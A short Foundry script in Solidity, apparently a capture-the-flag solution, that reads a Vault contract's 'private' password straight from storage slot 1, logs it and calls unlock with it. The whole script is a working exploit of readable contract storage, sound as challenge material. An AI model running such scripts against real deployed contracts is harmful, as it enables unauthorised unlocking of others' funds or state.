// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Vault} from "../src/Vault.sol";

contract SolveVault is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        Vault vault = Vault(vm.envAddress("VAULT_ADDRESS"));
        // The password is stored in storage slot 1
        bytes32 password = vm.load(vm.envAddress("VAULT_ADDRESS"), bytes32(uint256(1)));
        console.logBytes32(password);
        vault.unlock(password);

        vm.stopBroadcast();
    }
}
